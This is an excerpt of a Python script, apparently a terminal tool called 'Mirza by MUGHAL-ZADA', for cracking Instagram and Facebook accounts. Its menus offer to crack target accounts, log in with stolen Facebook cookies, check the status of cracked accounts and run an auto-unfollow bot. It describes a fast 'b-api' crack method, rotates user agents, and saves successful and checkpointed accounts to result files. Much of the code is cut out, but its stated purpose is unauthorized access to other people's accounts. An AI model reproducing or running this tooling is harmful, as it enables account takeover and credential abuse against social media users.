...
Mirza = open(os.devnull, "w")
my_music = subprocess.call(["dpkg","-s","play-audio"],stdout=Mirza,stderr=subprocess.STDOUT)
Mirza.close()
if my_music !=0:
	catet_play = ('# • modul play-audio is installing •')
...
+ ---------------------------------------- +
            ABOUT CRACK METHOD
+ ---------------------------------------- +
 - b-api: This method is a very fast process but 
           prone to spam
          so the results are reasonable 
...
sys.stdout.write('\x1b[1;35m\x1b]2; {×} Mirza by MUGHAL-ZADA {×} \x07')
...
def Masuk():
	try:
		...
		os.system('clear')
		banner()
		print ('\n%s%s%s 01 %sLogin instagram (instagram account crack) '%(U,til,K,O))
		print ('%s%s%s 02 %sLogin with cookie (crack facebook account) '%(U,til,K,O))
		print ('%s%s%s 03 %sHow to get facebook cookies '%(U,til,K,O))
		print ('%s%s%s 00 %sExit '%(U,til,M,O))
		while True:
			rom = input ("\n%s# %sPilih %s> %s"%(P,O,M,K))
			if rom in(""):
				print("%s%correct content "%(M,til))
			elif rom in ('1','01'):
				checkin()
			elif rom in ('2','02'):
...
def login():
	...
	try:
		os.system('clear')
		catet_req = ('# Login with your Instagram account and make sure the account is public. If the checkpoint login is required to use a new account, create a new account with the chrome browser')
		requ = rich.markdown.Markdown(catet_req, style='green')
		rich.console.Console().print(requ)
	...
	if x.get('status')=='success':
		...
		print ('\n%s%s Login succeed √'%(H,til));jeda(2)
		checkin()
...
{U}•{P} 04 {O}Crack target Account
{U}•{P} 05 {O}Check the status of the cracked account
{U}•{P} 06 {O}Auto unfollow bot
...
{U}•{M} 00 {O}Exit
	...
	def menu(self):
		...
		if c=='':
			print ('\n%s%s icorrect contentr'%(M,til));jeda(2)
			self.menu() 
		elif c in ('1','01'):
...
{U}{til}{P} 03 {O}User-Agent 3
		...
		if ua=='1':
			...
			uaAPI=user_agentAPI()
		print(f"""
{U}{til}{O} akun {H}[OK] {O}saved to file {M}> {H}IG/OK-{day}.txt
{U}{til}{O} akun {M}[{K}CP{M}] {O}saved to file {M}> {K}IG/CP-{day}.txt
